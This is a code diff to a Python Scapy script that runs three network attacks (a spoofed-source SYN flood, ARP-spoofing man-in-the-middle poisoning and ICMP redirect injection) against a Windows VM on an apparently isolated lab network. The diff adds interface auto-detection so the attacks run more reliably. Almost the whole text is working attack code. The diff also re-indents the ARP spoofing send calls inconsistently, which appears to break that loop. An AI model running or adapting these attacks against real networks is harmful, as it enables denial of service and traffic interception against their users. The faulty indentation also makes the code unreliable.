@@ -21,7 +21,7 @@ try:
     from scapy.all import (
         IP, TCP, ARP, Ether, ICMP,
         send, sendp, srp, get_if_hwaddr,
-        RandIP, RandShort, getmacbyip, conf
+        RandIP, RandShort, getmacbyip, conf, get_if_list, get_if_addr
     )
 except ImportError:
     print("[!] Scapy not installed. Run: pip install scapy")
@@ -31,7 +31,20 @@ except ImportError:
 VICTIM_IP    = "192.168.56.20"    # Windows 10 VM
 GATEWAY_IP   = "192.168.56.1"    # Host machine (vboxnet0)
 VICTIM_PORT  = 80                 # Port to SYN flood
-INTERFACE    = "eth0"             # Kali network interface (change if needed)
+INTERFACE    = "eth0"             # Kali network interface (auto-detected if possible)
+
+def _detect_iface():
+    try:
+        for name in get_if_list():
+            try:
+                ip = get_if_addr(name)
+                if ip and ip.startswith("192.168.56."):
+                    return name
+            except Exception:
+                continue
+    except Exception:
+        pass
+    return INTERFACE
 
 # ─────────────────────────────────────────────────────────────────────────────
 # Attack 1 — SYN Flood
@@ -42,7 +55,8 @@ def syn_flood(stop_event):
     with randomised spoofed source IPs.
     The victim's SYN_RECV backlog fills up, making the port unresponsive.
     """
-    print(f"[*] SYN Flood started → {VICTIM_IP}:{VICTIM_PORT}")
+    iface = _detect_iface()
+    print(f"[*] SYN Flood started → {VICTIM_IP}:{VICTIM_PORT} on {iface}")
     burst_size  = 150
     total_sent  = 0
 
@@ -52,7 +66,7 @@ def syn_flood(stop_event):
             TCP(sport=RandShort(), dport=VICTIM_PORT, flags="S", seq=1000)
             for _ in range(burst_size)
         ]
-        send(pkts, verbose=False, iface=INTERFACE)
+        send(pkts, verbose=False, iface=iface)
         total_sent += burst_size
         print(f"  [SYN] Sent {total_sent:,} packets", end="\r")
 
@@ -70,6 +84,7 @@ def arp_spoof(stop_event):
     All traffic between them now passes through Kali (MITM).
     """
     print(f"[*] Resolving MACs...")
+    iface = _detect_iface()
     victim_mac  = getmacbyip(VICTIM_IP)
     gateway_mac = getmacbyip(GATEWAY_IP)
 
@@ -80,7 +95,7 @@ def arp_spoof(stop_event):
         print(f"[!] Cannot resolve MAC for {GATEWAY_IP}")
         return
 
-    my_mac = get_if_hwaddr(INTERFACE)
+    my_mac = get_if_hwaddr(iface)
     print(f"[*] ARP Spoof started")
     print(f"    Victim  : {VICTIM_IP} ({victim_mac})")
     print(f"    Gateway : {GATEWAY_IP} ({gateway_mac})")
@@ -89,16 +104,16 @@ def arp_spoof(stop_event):
 
     while not stop_event.is_set():
         # Tell victim: "I am the gateway"
-        send(ARP(op=2,
+           send(ARP(op=2,
                  pdst=VICTIM_IP,  hwdst=victim_mac,
                  psrc=GATEWAY_IP, hwsrc=my_mac),
-             verbose=False, iface=INTERFACE)
+               verbose=False, iface=iface)
 
         # Tell gateway: "I am the victim"
-        send(ARP(op=2,
+           send(ARP(op=2,
                  pdst=GATEWAY_IP, hwdst=gateway_mac,
                  psrc=VICTIM_IP,  hwsrc=my_mac),
-             verbose=False, iface=INTERFACE)
+               verbose=False, iface=iface)
 
         count += 2
         print(f"  [ARP] Sent {count} poison packets", end="\r")
@@ -123,8 +138,9 @@ def icmp_redirect(stop_event):
     to come from the gateway, instructing the victim to route traffic
     for 8.8.8.8 through Kali instead of the real gateway.
     """
+    iface = _detect_iface()
     my_ip = conf.iface.ip if hasattr(conf.iface, 'ip') else "192.168.56.10"
-    print(f"[*] ICMP Redirect started → telling {VICTIM_IP} to route via {my_ip}")
+    print(f"[*] ICMP Redirect started → telling {VICTIM_IP} to route via {my_ip} on {iface}")
     count = 0
 
     while not stop_event.is_set():
@@ -134,7 +150,7 @@ def icmp_redirect(stop_event):
             IP(src=VICTIM_IP, dst="8.8.8.8") /
             TCP(sport=1234, dport=80)
         )
-        send(pkt, verbose=False, iface=INTERFACE)
+        send(pkt, verbose=False, iface=iface)
         count += 1
         print(f"  [ICMP] Sent {count} redirect packets", end="\r")
         time.sleep(0.5)
